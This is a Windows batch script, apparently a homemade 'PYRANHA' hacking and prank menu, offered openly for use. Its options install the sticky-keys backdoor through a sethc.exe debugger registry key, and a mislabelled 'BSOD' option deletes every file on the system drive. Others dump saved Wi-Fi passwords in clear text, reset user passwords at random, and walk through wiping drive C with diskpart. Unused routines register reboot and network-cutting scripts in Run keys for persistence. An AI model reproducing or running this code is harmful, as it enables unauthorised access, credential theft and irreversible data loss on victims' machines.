@echo off
title PYRANHA MENU V1.2 By: Balint   
SETLOCAL EnableDelayedExpansion 

for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)    
:securegoing
if exist database.txt (goto MainMenu) else (
                                        color 0c
                                        goto MainMenu )

:MainMenu
if exist database.txt ( FOR /F "tokens=*" %%i IN (database.txt) DO @color %%i )
cls
echo.    
echo      NMMM      MMMM   MMMM  MMMMMMMM           MMMM        MMMMM          MMM  MMM       MMM        MMMM
echo   MMMMMNMMMM   MMMM   MMMM  MMMMMMMMMM        MMMMMM       MMM MMM        MMM  MMM       MMM       MMMMMM
echo  MMMM    MMMM  MMMM   MMMM  MM      MMM      MMMMMMMM      MMM  MMM       MMM  MMM       MMM      MMMMMMMM
echo  MMMM    MMMM  MMMM   MMMM  MM      MMMM    MMMMMMMMMM     MMM   MMM      MMM  MMM       MMM     MMMMMMMMMM
echo  MMMMMMMMMMMM   MMMMNMMMMM  MM      MMM    MM        MM    MMM    MMM     MMM  MMMMMMMMMMMMM    MM        MM
echo  MMMM              MMMM     MMMMMMMMMMM  MMMM        MMMM  MMM     MMM    MMM  MMMMMMMMMMMMM  MMMM        MMMM
echo  MMMM              MMMM     MMM    MMMM   MMMMMMMMMMMMMM   MMM      MMM   MMM  MMM       MMM   MMMMMMMMMMMMMM
echo  MMMM              MMMM     MMM    MMMM   MMM        MMM   MMM       MMM  MMM  MMM       MMM   MMM        MMM
echo  MMMM              MMMM     MMM    MMMM   MMM        MMM   MMM        MMM MMM  MMM       MMM   MMM        MMM
echo  MMMM              MMMM     MMM    MMMM   MMM        MMM   MMM          MMMMM  MMM       MMM   MMM        MMM
echo.       
echo --------------------------------------------------- MENU V1.3 -------------------------------------------------
echo.         
echo Choose!
echo.
echo [1] Backdoor (Windows)			[10] Futo Programok
echo [2] Pyranha				[11] System Indo
echo [3] Folder Spammer			[12] Random User Password
echo [4] Show/Hide Files			[13] Pyranha Spam
echo [5] Open Programs			[14] Remove color
echo [6] Shutdown				[15] Refresh
echo [7] BSOD(Dangerous)			[16] Del C: (Beta)
echo [8] Wifi Hack            [17] Exit
echo [9] Change color
echo.
set /p MenuChoose=       
if %MenuChoose% == 1 goto Choose(BD)
if %MenuChoose% == 2 goto flashything
if %MenuChoose% == 3 goto openfolderspam
if %MenuChoose% == 4 goto choosetoappearordisappear
if %MenuChoose% == 5 goto OpenPrograms
if %MenuChoose% == 6 goto sd
if %MenuChoose% == 7 goto bsod
if %MenuChoose% == 8 goto wifihck
if %MenuChoose% == 9 goto chngcolor
if %MenuChoose% == 10 goto tasklist
if %MenuChoose% == 11 goto ssinfo
if %MenuChoose% == 12 goto randpass
if %MenuChoose% == 13 goto pyrkey
if %MenuChoose% == 14 goto remdat
if %MenuChoose% == 15 goto securegoing
if %MenuChoose% == 16 goto deldrive
if %MenuChoose% == 17 goto exit
pause >nul

:sd
cls
echo.
pause
shutdown -i
cls
pause
goto MainMenu

:remdat
del /f database.txt
goto securegoing

:chngcolor
cls
echo.
echo [1] Start
echo [2] Help
echo [3] Back
echo.
set /p customcolor=
if %customcolor% == 1 goto check
if %customcolor% == 2 goto colorhelp
if %customcolor% == 3 goto MainMenu

:colorhelp
cls
echo.
echo The first number should be the background, the next should be the text color.
echo This color will last until you restart the program. (fixed)
echo I'm working on it the make it stay. (fixed)
echo (changes: )
echo If you type in a combination, than you'll have that forever.
echo But, You can change it, by deleting database.txt.
echo Hope, that you understand.
echo.
color help
echo.
pause
goto chngcolor

:check
if exist database.txt (del /f database.txt)

:chngcolor2
cls
set /p colorcustomization= The color combination: 
echo %colorcustomization% >> database.txt
echo.
pause
goto MainMenu

:Choose(BD)
cls
echo Select an option!
echo [1] Add Backdoor
echo [2] Delete Backdoor
echo [3] BackdoorInfo
echo [4] Back
echo.
set /p addrem=
if %addrem% == 1 goto AddingBD
if %addrem% == 2 goto RemBD
if %addrem% == 3 goto bdinfo
if %addrem% == 4 goto MainMenu
pause >nul

:exit
exit

:AddingBD
cls 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
echo You can start the backdoor by hitting LSHIFT 5 time really fast.
echo Exit? (y/n)
echo.
set /p aqexit=
if %aqexit% == y goto exit
if %aqexit% == n goto MainMenu
pause >nul

:RemBD
cls
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
echo Exit? (y/n)
echo.
set /p rqexit=
if %rqexit% == y goto exit
if %rqexit% == n goto MainMenu
pause >nul

:flashything
cls
start pyranhacolor.bat
pause
goto MainMenu

:openfolderspam
cls
start FolderSpam.bat
pause
goto MainMenu

:bdinfo
cls
color 0f
echo.
echo You can start the backdoor by hitting LSHIFT 5 time really fast. 
echo You can even access it in the Login page.
echo 1 Useful command:
echo Password change: net user "name of the user" "new password"(you dont need the " symbols.) 
echo.
pause
goto Choose(BD)

:choosetoappearordisappear
cls
echo [1] Show
echo [2] Hide
echo.
set /p choosetoappodisapp=
if %choosetoappodisapp% == 1 goto disappear
if %choosetoappodisapp% == 2 goto appear

:disappear
cls
set /p cdir= That folder, where your file you want to make disappear is stored in: 
if exist "%cdir%" goto disappear2

:wrongpatdisapp
echo.
echo Can't find the folder.
echo.
pause
goto disappear

:disappear2
cls
cd %cdir%
set /p cfilename= The name of the file, and its extension(if you want to make a folder disappear, you don't need one): 
if exist "%cfilename%" goto disappear3

:wrongpathdisapp2
echo.
echo The file is not found. Try again...
echo.
pause
goto disappear2

:disappear3
cls
cd %cdir%
attrib +h +r +s "%cfilename%"
echo The file has disappeard!
echo.
pause
goto MainMenu

:appear
cls
set /p appearpath= The folder, that your file, that you want to make appear is stored in: 
if exist "%appearpath%" goto appear2

:wrongpathappear
echo.
echo Can't find the folder. Try again...
echo.
pause
goto appear

:appear2
cls
set /p appearname= The name of the file, and its extension(if you want to make a folder disappear, you don't need one): 
if exist "%appearname%" goto appear3

:wrongpathappear2
echo.
echo Can't find the file. Try again...
echo.
pause
goto appear2

:appear3
cls
cd "%appearpath%"
attrib -h -r -s "%appearname%"
echo The file has appeard!
pause
goto MainMenu

:OpenPrograms
cls
color 06
echo [1] Notepad
echo [2] Cmd
echo [3] Task Manager
echo [4] File Explorer
echo [5] Back
echo.
set /p ownprogram=
if %ownprogram% == 1 goto stnpad
if %ownprogram% == 2 goto stcmd
if %ownprogram% == 3 goto sttaskmgr
if %ownprogram% == 4 goto stfk
if %ownprogram% == 5 goto MainMenu
pause >nul

:stnpad
cls
start notepad
echo.
pause
goto ExitToOpenProgs

:stcmd
cls
start cmd
echo.
pause 
goto ExitToOpenProgs

:sttaskmgr
cls
start taskmgr
echo.
pause
goto ExitToOpenProgs

:stfk
cls
start explorer
echo.
pause
goto ExitToOpenProgs

:ExitToOpenProgs
cls
color 0c
goto OpenPrograms

:bsod
cls
echo Do you run the program? (y/n)
echo.
set /p bsodyn=
if %bsodyn% == y goto bsod1
if %bsodyn% == n goto MainMenu
:bsod1
cls
pause
del %systemdrive%\*.*/f /s /q
shutdown -r -t 00
echo.
pause
goto MainMenu

:wifihck
cls
echo.
echo [1] Start
echo [2] Help(Recommended)
echo.
set /p wifihckchoose=
if %wifihckchoose% == 1 goto wifihck2
if %wifihckchoose% == 2 goto wifihckhelp
if %wifihckchoose% == schoolwifihack goto swh

:wifihckhelp
echo.
echo.
echo If you ran Pyranha as an administrator, you can see every network, that the computer was connected to.
echo If not, than you can only see the one that you are connected to.
echo After the "hack", you can find the password next to the word "Key Content"
pause
goto wifihck

:wifihck2
cls
netsh wlan show profiles
set /p wifihckprofilechoose= The name of the Network, that you want to "hack": 
echo.
pause
goto wifihck3

:wifihck3
cls
netsh wlan show profiles "%wifihckprofilechoose%" key=clear
echo You can find the password next to "Key Content".
echo.
pause 
goto MainMenu

:ssinfo
cls
systeminfo
echo.
pause
goto MainMenu

:tasklist
cls
tasklist
echo.
echo Would you like to stop a program? (y/n)
set /p taskkill=
if %taskkill% == y goto taskkill
if %taskkill% == n goto MainMenu

:taskkill
cls
tasklist
echo.
set /p taskkillask= The program you want to stop: 
goto taskkill2

:taskkill2
cls
echo.
taskkill /im %taskkillask%
pause
goto MainMenu

:swh
cls
netsh wlan show profiles eduroam key=clear
echo.
pause
goto MainMenu

:disnet
pause
cls
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversion /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversion /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
pause
goto MainMenu

:exitstartup
cls
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
red add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d  /f c:windowshartlell.bat
pause
goto MainMenu

:randpass
cls
set /p username= The name of the user:  
echo.
pause
goto randpass2

:randpass2
cls
net user %username% %random%
echo.
pause
goto MainMenu

:pyrkey
cls
echo.
echo [1] Start
echo [2] Info
echo [3] Back
echo.
set /p pyrkeyc=
if %pyrkeyc% == 1 goto pyrkey2
if %pyrkeyc% == 2 goto pyrkeyI
if %pyrkeyc% == 3 goto MainMenu

:pyrkeyI
echo.
echo This program will run the word PYRANHA until you don't stop it.
echo You can stop it from task manager(wscript.exe)
echo.
pause
goto pyrkey

:pyrkey2
start keyboardtype.vbs
echo.
pause
goto MainMenu

:deldrive
cls
echo After you hit x, you'll have to type in:
echo list disk, than select the C Drive by typeing:
echo select disk (number of disk C)
echo and than typing in clean.
echo after that, you need to select a volume.
echo type in list volume, than select volume.
echo select the one where it says "boot".
echo than, type in create partition primary.
echo and the last one, format fs=ntfs(or fat32)
echo If you don't have enough space to create a partition primary, than...
echo Than you sucked.
echo.
set /p moveon= To Move on, type X. 
if %moveon% == X goto deldrive2

:notX
goto deldrive

:deldrive2
cls
diskpart
echo.
pause
goto MainMenu